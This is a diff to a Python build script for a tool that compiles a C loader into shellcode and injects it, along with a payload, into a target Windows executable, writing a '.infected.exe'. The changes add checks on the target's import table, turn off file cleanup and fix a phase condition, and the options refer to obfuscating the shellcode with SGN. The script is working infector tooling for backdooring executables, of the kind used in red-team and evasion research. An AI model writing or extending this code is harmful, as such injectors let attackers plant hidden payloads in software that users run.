@@ -4,6 +4,7 @@ from helper import *
 import argparse
 
 from config import config
+from pehelper import *
 from phases.ctoasm import *
 from phases.asmtoshc import *
 from phases.shctoexe import *
@@ -47,12 +48,12 @@ options_default = {
     "try_start_final_infected_exe": True, # with payload (should work)
 
     # cleanup
-    "cleanup_files_on_start": True,
-    "cleanup_files_on_exit": True,
+    "cleanup_files_on_start": False,
+    "cleanup_files_on_exit": False,
 
     # For debugging: Can disable some steps
-    "generate_asm_from_c": True,    # phase 2
-    "generate_shc_from_asm": True,  # phase 3
+    "generate_asm_from_c": True,  
+    "generate_shc_from_asm": True, 
 
     # Not working atm
     "obfuscate_shc_loader": False,
@@ -146,32 +147,46 @@ def main():
             options["inject_exe"] = True
             options["inject_exe_in"] = args.inject
             options["inject_exe_out"] = args.inject.replace(".exe", ".infected.exe")
+    start(options)
 
 
+def start(options):
+    # Delete: all old files
     if options["cleanup_files_on_start"]:
         clean_files()
 
+    # Copy: loader C files into working directory: build/
     shutil.copy("source/main.c", "build/main.c")
     shutil.copy("source/peb_lookup.h", "build/peb_lookup.h")
 
+    # Check: Destination EXE capabilities
+    exe_capabilities = {
+        "MessageBoxW": None,
+    }
+    resolve_iat_capabilities(exe_capabilities, options["inject_exe_in"])
+
+    # Convert: C -> ASM
     if options["generate_asm_from_c"]:
+        # Find payload size
         with open(options["payload"], 'rb') as input2:
             data_payload = input2.read()
-            l = len(data_payload)
+            payload_length = len(data_payload)
             debug_data["payload_shellcode"] = data_payload
-        asm = make_c_to_asm(main_c_file, main_asm_file, l)
+        asm = make_c_to_asm(main_c_file, main_asm_file, payload_length, exe_capabilities)
         debug_data["asm_initial"] = asm["initial"]
         debug_data["asm_cleanup"] = asm["cleanup"]
         debug_data["asm_fixup"] = asm["fixup"]
 
-    if options["generate_asm_from_c"]:
+    # Convert: ASM -> Shellcode
+    if options["generate_shc_from_asm"]:
         code = make_shc_from_asm(main_asm_file, main_exe_file, main_shc_file)
         debug_data["loader_shellcode"] = code
     
+    # Try: Starting the shellcode (rarely useful)
     if options["try_start_loader_shellcode"]:
         try_start_shellcode(main_shc_file)
 
-    # SGN seems buggy atm
+    # SGN 
     #if options["obfuscate_shc_loader"]:
     #    obfuscate_shc_loader("main-clean.bin", "main-clean.bin")
     #
